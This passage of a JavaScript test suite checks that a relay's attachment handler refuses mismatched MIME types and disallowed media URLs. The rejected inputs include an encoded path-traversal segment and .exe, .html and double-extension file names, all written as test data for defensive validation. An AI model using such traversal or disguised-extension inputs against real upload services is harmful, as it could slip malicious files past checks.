  let m = null; try { attachmentExtFor(mime, nm); } catch (e) { m = e.message; } ok(m && /refusing rather than guessing/.test(m), `attachmentExtFor(${mime}, ${nm}) throws (no fallback)`);
}
const desc = (s, c) => { try { return checkDescriptorMime(s, c, "f"); } catch (e) { return e.message; } };
ok(desc(DOCX, DOCX) === true && desc("application/pdf", "application/pdf") === true && desc("application/octet-stream", "application/octet-stream") === true, "equal types accepted");
ok(ZIP_DOCUMENT_MIMES.every((m) => desc("application/zip", m) === true), "application/zip accepted for all six OOXML/ODF types");
ok(/refused — the relay stored it as "application\/zip" but the shim classified it as "application\/pdf"/.test(desc("application/zip", "application/pdf")), "zip for a pdf → refused, names both types");
ok(/stored it as "text\/html"/.test(desc("text/html", "application/octet-stream")), "text/html for text → refused");
ok(/stored it as "application\/pdf".*"image\/png"/.test(desc("application/pdf", "image/png")), "pdf for a png → refused");
ok(/stored it as "\(no type\)"/.test(desc(undefined, DOCX)) && /\(no type\)/.test(desc("", DOCX)), "missing descriptor type → refused (fail closed)");
ok(/stored it as "application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.sheet"/.test(desc(XLSX_M, DOCX)), "xlsx for a docx → refused");

console.log("should-fix — hosted attachment_read validates <sha>.<ext>:");
{
  const S = "ab".repeat(32);
  const p = (u, sha = S, hosted = true) => { try { return parseMediaShaExt(u, sha, { hosted }); } catch (e) { return "ERR " + e.message; } };
  ok(p(`https://relay/media/${S}.pdf`) === `${S}.pdf` && p(`https://relay/media/${S}`) === S && p(`https://relay/media/${S}.bin`) === `${S}.bin`, "<sha>.pdf / <sha> / <sha>.bin accepted");
  ok(/not one the relay issues/.test(p(`https://relay/media/${S}.html`)) && /not one the relay issues/.test(p(`https://relay/media/${S}.exe`)) && /not one the relay issues/.test(p(`https://relay/media/${S}.svg`)), "hosted: .html / .exe / .svg refused");
  ok(p(`https://relay/media/${S}.exe`, S, false) === `${S}.exe`, "stdio mode: ext allow-list not applied (sha still checked)");
  ok(/not \/media\/<sha256>/.test(p(`https://relay/media/${S}.pdf%2f..%2fx`)) && /not \/media\/<sha256>/.test(p(`https://relay/media/${S}.PDF`)) && /not \/media\/<sha256>/.test(p(`https://relay/media/${S.toUpperCase()}.pdf`)) && /not \/media\/<sha256>/.test(p(`https://relay/media/${S}.pdf.exe`)), "encoded / upper-case / double-ext segments refused");
  ok(/≠ imeta x/.test(p(`https://relay/media/${"cd".repeat(32)}.pdf`)), "sha in URL ≠ imeta x → refused");
  ok(/not a URL/.test(p("not a url")), "non-URL refused");
  ok(!RELAY_MEDIA_EXTS.includes("html") && RELAY_MEDIA_EXTS.includes("docx") && RELAY_MEDIA_EXTS.includes("bin"), "relay ext list: no html; docx and bin present");
}

console.log("real-ordered fixtures (LibreOffice / python-docx / openpyxl / python-pptx, from buzz-cli tests):");
{
  const dir = new URL("./fixtures/uploads/", import.meta.url);
  const want = { "docx-main-past-4k.docx": DOCX, "libreoffice.docx": DOCX, "libreoffice.odt": ODT_M, "libreoffice.xlsx": XLSX_M, "openpyxl.xlsx": XLSX_M, "python-docx.docx": DOCX, "python-pptx.pptx": PPTX_M, "xlsx-docprops-third.xlsx": XLSX_M };
  const files = readdirSync(dir).filter((f) => !f.endsWith(".md")).sort();
  ok(JSON.stringify(files) === JSON.stringify(Object.keys(want).sort()), `all ${Object.keys(want).length} fixtures present`);
  for (const [f, mime] of Object.entries(want)) {
    const b = readFileSync(new URL(f, dir));
    expectOk(f, b, mime, `${f} (${b.length} B)`);
    ok(attachmentDisplayName("Upload " + f.replace(/\.\w+$/, ".zip"), mime) === "Upload " + f.replace(/\.\w+$/, "." + attachmentExtFor(mime)), `${f}: name from local type (.zip → .${attachmentExtFor(mime)})`);
  }
  const past = readFileSync(new URL("docx-main-past-4k.docx", dir));
  ok(past.indexOf(Buffer.from("word/document.xml")) > 4096, "docx-main-past-4k really has word/document.xml past 4 KiB (relay stores it as application/zip)");
  // Fixture + one appended trailing byte, or a truncated copy → refused (fail closed on real data too).
  expectRefused("t.docx", Buffer.concat([past, Buffer.from([0])]), /inconsistent directory/, "real docx + 1 trailing byte");
  expectRefused("t.docx", past.subarray(0, past.length - 30), /inconsistent directory|unsupported/, "real docx truncated");
}

console.log(`\n${fail === 0 ? "ALL PASS" : "FAILURES"}: ${pass} passed, ${fail} failed`);
if (fail) process.exit(1);
